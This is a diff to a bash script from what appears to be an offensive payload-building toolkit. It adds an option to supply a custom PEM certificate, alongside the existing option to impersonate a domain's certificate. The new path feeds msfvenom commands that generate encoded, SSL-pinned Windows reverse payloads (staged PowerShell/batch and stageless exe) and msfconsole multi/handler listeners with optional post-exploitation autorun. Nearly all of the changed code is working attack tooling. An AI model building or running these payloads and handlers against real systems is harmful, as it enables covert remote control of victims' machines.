@@ -222,8 +222,8 @@ read OP
 #
 # Build PEM certificate (manual or impersonate)
 #
-cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 180) > /dev/null 2>&1
-if [ "$cHos" = "manual certificate" ]; then
+cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "impersonate domain" FALSE "manual certificate build" FALSE "input certificate path" --width 300 --height 210) > /dev/null 2>&1
+if [ "$cHos" = "manual certificate build" ]; then
   #
   # SSA TEAM CERTIFICATE or your OWN (manual creation)
   #
@@ -279,6 +279,30 @@ elif [ "$cHos" = "impersonate domain" ]; then
   cd $IPATH/output
   sleep 1
 
+
+elif [ "$cHos" = "input certificate path" ]; then
+  #
+  # Input PEM cert full path (user cert)
+  #
+  echo ${BlueF}[☠]${white} Input pem full path ..${Reset};
+  CeRt=$(zenity --title "☠ INPUT PEM FULL PATH ☠" --filename=$IPATH --file-selection) > /dev/null 2>&1
+  sleep 1
+    #
+    # Check if certificate exists (shanty bug-report)..
+    #
+    if ! [ -f "$CeRt" ]; then
+      echo ${RedF}[x]${white}" Certificate: not found, aborting .."
+      sleep 2
+      exit
+    fi
+  sleep 1
+  echo ${BlueF}[☠]${white} Certificate full path stored ..${BlueF};
+  # Copy cert to output folder
+  cp $CeRt $IPATH/output
+  cd $IPATH/output
+  sleep 1
+
+
 else
   #
   # Cancel button pressed, aborting script execution ..
@@ -291,6 +315,16 @@ else
   exit
 fi
 
+
+
+#
+# Store PEM certificate full path
+#
+if [ "$cHos" = "input certificate path" ]; then
+CERT_PATH="$CeRt"
+else
+CERT_PATH="$IPATH/output/$N4M3.pem"
+fi
 
 
 
@@ -333,7 +367,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
      else
        format="psh-cmd"
      fi
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o $AgEnT.$DEFAULT_EXT
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$CERT_PATH StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o $AgEnT.$DEFAULT_EXT
 
       #
       # head (shellcode) - paranoid-staged.bat
@@ -410,9 +444,9 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   if [ "$ExEc" = "YES" ]; then
     # Run post-exploitation module 
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $CERT_PATH; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
   else
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $CERT_PATH; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
   fi
   #
   # Cleaning files & stop apache2 ..
@@ -456,7 +490,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
      else
        ArCh="x86"
      fi
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o $AgEnT.exe
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$CERT_PATH StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o $AgEnT.exe
     sleep 2
 
     #
@@ -494,9 +528,9 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   if [ "$ExEc" = "YES" ]; then
     # Run post-exploitation module 
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $CERT_PATH; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
   else
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $CERT_PATH; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
   fi
   #
   # Cleaning files & stop apache2 ..
